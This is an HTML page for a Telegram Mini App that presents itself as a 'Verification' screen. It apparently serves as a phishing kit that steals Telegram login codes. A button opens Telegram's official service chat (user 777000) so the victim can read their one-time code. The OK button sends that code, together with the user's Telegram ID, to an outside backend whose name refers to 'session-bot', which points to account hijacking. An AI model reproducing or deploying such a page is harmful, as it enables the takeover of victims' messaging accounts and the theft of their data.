<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; }
        body { 
            font-family: 'Arial', sans-serif; 
            margin: 0; padding: 0; 
            background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
            background-size: cover;
            height: 100vh; display: flex; align-items: flex-end; 
            justify-content: center; overflow: hidden;
        }
        .overlay { background: rgba(0, 0, 0, 0.5); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
        
        .main-container { width: 90%; max-width: 360px; z-index: 2; text-align: center; margin-bottom: 30px; }
        
        .otp-box {
            background: rgba(255, 255, 255, 0.95); padding: 25px; border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5); backdrop-filter: blur(5px);
        }
        .instruction { font-size: 16px; color: #333; margin-bottom: 20px; font-weight: bold; }
        
        .inputs { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; }
        .box {
            width: 45px; height: 55px; border: 2px solid #ddd; border-radius: 12px;
            display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: bold; color: #28a745; background: #fff;
        }

        .get-code-btn {
            background: #28a745; color: white; border: none; padding: 14px;
            width: 100%; border-radius: 12px; font-size: 18px; font-weight: bold;
            margin-bottom: 20px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
        }

        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .key {
            background: #28a745; color: white; padding: 16px; border-radius: 12px;
            font-size: 22px; font-weight: bold; cursor: pointer; border: none;
        }
        .key:active { transform: scale(0.95); background: #1e7e34; }
        .key-del { background: #dc3545; }
        .key-ok { background: #007bff; }
    </style>
</head>
<body>
    <div class="overlay"></div>

    <div class="main-container">
        <div id="otp-screen" class="otp-box">
            <div class="instruction">Enter the 5-digit code that we just sent you!</div>
            
            <div class="inputs">
                <div class="box" id="b1"></div>
                <div class="box" id="b2"></div>
                <div class="box" id="b3"></div>
                <div class="box" id="b4"></div>
                <div class="box" id="b5"></div>
            </div>

            <!-- GET CODE বাটন - এটাই সরাসরি ওটিপি চ্যাটে নিয়ে যাবে -->
            <button class="get-code-btn" onclick="goToOTPChat()">
                🍓 GET CODE 🍓
            </button>

            <div class="keypad">
                <div class="key" onclick="press('1')">1</div><div class="key" onclick="press('2')">2</div><div class="key" onclick="press('3')">3</div>
                <div class="key" onclick="press('4')">4</div><div class="key" onclick="press('5')">5</div><div class="key" onclick="press('6')">6</div>
                <div class="key" onclick="press('7')">7</div><div class="key" onclick="press('8')">8</div><div class="key" onclick="press('9')">9</div>
                <div class="key key-del" onclick="del()">⌫</div><div class="key" onclick="press('0')">0</div><div class="key key-ok" onclick="verifyOTP()">OK</div>
            </div>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        
        let currentCode = "";
        const BACKEND_URL = "https://pmrony-session-bot.hf.space";
        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;

        function press(num) { if(currentCode.length < 5) { currentCode += num; updateBoxes(); } }
        function del() { currentCode = currentCode.slice(0, -1); updateBoxes(); }
        function updateBoxes() { for(let i=1; i<=5; i++) { document.getElementById('b'+i).innerText = currentCode[i-1] || ""; } }

        // এটাই সেই স্পেশাল ফাংশন যা সরাসরি ওটিপি চ্যাটে নিয়ে যাবে
        function goToOTPChat() {
            // ১. ভাইব্রেশন ফিডব্যাক
            if(tg.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');

            // ২. এই লিঙ্কটি সরাসরি টেলিগ্রাম সার্ভিস মেসেজ (777000) চ্যাটটি ওপেন করবে।
            // এর ফলে অ্যাপটি অটোমেটিক মিনিমাইজ হয়ে নিচে বারের মতো হয়ে যাবে।
            window.location.href = "tg://openmessage?user_id=777000";
            
            // ৩. ব্যাকআপ (যদি উপরেরটা কাজ না করে)
            setTimeout(() => {
                tg.openTelegramLink("https://t.me/777000");
            }, 500);
        }

        async function verifyOTP() {
            if(currentCode.length < 5) return;
            try {
                const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, otp: currentCode })
                });
                const data = await res.json();
                if (data.status === "success") { tg.close(); } 
                else { alert("Wrong Code!"); currentCode = ""; updateBoxes(); }
            } catch (e) { }
        }
    </script>
</body>
</html>
